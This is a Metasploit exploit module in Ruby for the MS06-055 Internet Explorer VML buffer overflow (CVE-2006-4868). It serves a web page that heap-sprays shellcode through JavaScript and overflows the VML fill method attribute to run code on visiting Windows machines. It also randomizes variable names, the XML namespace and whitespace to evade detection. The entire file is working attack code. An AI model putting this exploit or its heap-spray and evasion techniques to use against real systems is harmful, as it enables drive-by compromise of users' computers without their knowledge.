require 'msf/core'

module Msf

class Exploits::Windows::Browser::MS06_055_VML_Overflow < Msf::Exploit::Remote

	include Exploit::Remote::HttpServer::Html

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer VML Fill Method Code Execution',
			'Description'    => %q{
				This module exploits a code execution vulnerability in Microsoft Internet Explorer using 
				a buffer overflow in the VML processing code (VGX.dll). This module has been tested on
				Windows 2000 SP4, Windows XP SP0, and Windows XP SP2.
			},
			'License'        => MSF_LICENSE,
			'Author'         => 
				[ 
					'hdm',
					'Aviv Raff <avivra [at] gmail.com>',
					'Trirat Puttaraksa (Kira) <trir00t [at] gmail.com>',
					'Mr.Niega <Mr.Niega [at] gmail.com>',
					'M. Shirk <shirkdog_list [at] hotmail.com>'
				],
			'Version'        => '$Revision: 3783 $',
			'References'     => 
				[
					['MSB',   'MS06-055' ],
					['CVE',   '2006-4868' ],
					['BID',   '20096' ],
					['OSVDB', '28946' ],
				],
			'Payload'        =>
				{
					'Space'          => 1024,
					'BadChars'       => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows NT 4.0 -> Windows 2003 SP1', {'Ret' => 0x0c0c0c0c} ]
				],
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end
	
	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Determine the buffer length to use
		buflen = 1024
		if (request.headers['User-Agent'] =~ /Windows 5\.[123]/)
			buflen = 65535
		end
		
		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		
		# Get a unicode friendly version of the return address
		addr_word  = [target.ret].pack('V').unpack('H*')[0][0,4]
		
		# Select a random VML element to use
		vmls = %w{ rect roundrect line polyline oval image arc curve }
		vmlelem = vmls[ rand(vmls.length) ]
		
		# The overflow buffer for the method attribute
		buffer = ("&#x" + addr_word + ";") * buflen
		
		# Generate a random XML namespace for VML
		xmlns = Rex::Text.rand_text_alpha(rand(30)+2)

		# Randomize the javascript variable names	
		var_buffer    = Rex::Text.rand_text_alpha(rand(30)+2)
		var_shellcode = Rex::Text.rand_text_alpha(rand(30)+2)
		var_unescape  = Rex::Text.rand_text_alpha(rand(30)+2)
		var_x         = Rex::Text.rand_text_alpha(rand(30)+2)
		var_i         = Rex::Text.rand_text_alpha(rand(30)+2)
		
		# Build out the message
		content = %Q|
<html xmlns:#{xmlns} = " urn:schemas-microsoft-com:vml " >
<head>
<style> #{xmlns}\\:* { behavior: url(#default#VML) ; } </style>
<body>
<script>

	var #{var_unescape}  = unescape ;
	var #{var_shellcode} = #{var_unescape}( "#{shellcode}" ) ;
	
	var #{var_buffer} = #{var_unescape}( "%u#{addr_word}" ) ;
	while (#{var_buffer}.length <= 0x400000) #{var_buffer}+=#{var_buffer} ;

	var #{var_x} = new Array() ;	
	for ( var #{var_i} =0 ; #{var_i} < 30 ; #{var_i}++ ) {
		#{var_x}[ #{var_i} ] = 
			#{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} +
			#{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} + 
			#{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} + 		
			#{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} ;
	}

</script>
<#{xmlns}:#{vmlelem}>
	<#{xmlns}:fill method = "#{buffer}" />
</#{xmlns}:#{vmlelem}>

</body>
</html>
		|

		# Randomize the whitespace in the document
		content.gsub!(/\s+/) do |s|
			len = rand(100)+2
			set = "\x09\x20\x0d\x0a"
			buf = ''
			
			while (buf.length < len)
				buf << set[rand(set.length)].chr
			end
			
			buf
		end


		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response(cli, content)
	end

end

end
